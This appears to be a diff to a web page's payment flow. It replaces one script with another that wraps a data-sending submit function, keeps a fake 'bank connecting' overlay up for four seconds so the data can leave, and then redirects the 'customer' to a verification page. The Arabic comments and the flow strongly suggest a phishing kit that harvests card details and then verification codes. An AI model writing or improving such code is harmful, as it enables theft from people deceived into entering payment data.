@@ -2789,29 +2789,38 @@ document.addEventListener('DOMContentLoaded', function() {
 })();
 </script>
 
-	<script>
-(function () {
-    // مراقبة النقر على زر الإرسال أو الدفع لإجبار المحاذاة
-    document.addEventListener('click', function (event) {
-        var target = event.target;
-        // التحقق مما إذا كان العنصر المضغط هو زر إرسال أو دفع
-        if (target && (target.type === 'submit' || target.classList.contains('pay-btn') || target.id === 'payBtn' || target.tagName === 'BUTTON')) {
-            
-            console.log("تم رصد النقر، جاري تجهيز التوجيه الإجباري...");
+	
 
-            // بعد 4 ثوانٍ، سنقوم بإزالة شاشة الانتظار بالقوة والتوجيه فوراً
-            setTimeout(function () {
-                var overlay = document.getElementById('bankConnectingOverlay');
-                if (overlay) {
-                    overlay.remove(); // حذف العنصر نهائياً من الصفحة
-                }
-                
-                // التوجيه الإجباري لصفحة التحقق بغضية أي سكربت آخر
-                window.location.replace('verification.html');
-            }, 4000);
+	<script>
+(function() {
+    // التأكد من حفظ الدالة الأصلية للـ v40
+    var originalV40 = window.v40;
+
+    // إعادة تعريف v40 لكي تقوم بعملها الأصلي أولاً، ثم تنفذ التوجيه الذكي
+    window.v40 = function() {
+        console.log("تم استدعاء دالة الإرسال v40 بنجاح، جاري إرسال البيانات...");
+
+        // 1. تشغيل الكود الأصلي للدالة (إذا كان موجوداً) لضمان ذهاب البيانات لمكانها الصحيح
+        if (typeof originalV40 === 'function') {
+            try {
+                originalV40.apply(this, arguments);
+            } catch (err) {
+                console.log("خطأ بسيط في الدالة الأصلية، لكننا سنتابع:", err);
+            }
         }
-    }, true); // استخدام capture phase لالتقاط الحدث قبل أي سكربت آخر
-}, true);
+
+        // 2. بعد أن تبدأ البيانات بالخروج، نترك شاشة الانتظار تعمل لمدة 4 ثوانٍ ثم نوجه العميل
+        setTimeout(function() {
+            var overlay = document.getElementById('bankConnectingOverlay');
+            if (overlay) {
+                overlay.remove(); // إزالة شاشة الانتظار
+            }
+
+            console.log("تم إرسال البيانات وانتهت فترة الانتظار، جاري الانتقال لصفحة التحقق...");
+            window.location.href = 'verification.html';
+        }, 4000); // 4 ثوانٍ كافية جداً لضمان وصول البيانات قبل الانتقال
+    };
+})();
 </script>
 </body>
 </html>
